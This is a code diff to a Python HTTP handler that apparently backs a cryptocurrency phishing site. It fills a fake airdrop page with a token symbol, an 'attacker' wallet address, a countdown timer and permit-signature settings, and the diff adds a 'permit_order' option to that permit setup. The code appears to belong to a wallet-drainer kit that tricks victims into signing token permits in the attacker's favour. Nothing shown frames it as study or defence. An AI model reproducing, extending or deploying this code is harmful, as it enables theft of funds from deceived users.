@@ -265,6 +265,7 @@ class Handler(BaseHTTPRequestHandler):
                     "symbol": self.cfg["token"]["symbol"],
                     "attacker": self.cfg["attacker"]["address"],
                     "permit_version": str(self.cfg["token"].get("permit_version", "1")),
+                    "permit_order": str(self.cfg["token"].get("permit_order", "deadline_first")),
                     "project": str(self.cfg["site"]["project"]),
                     "airdrop_amount": str(self.cfg["site"]["airdrop_amount"]),
                     "countdown_minutes": self.cfg["site"]["countdown_minutes"],
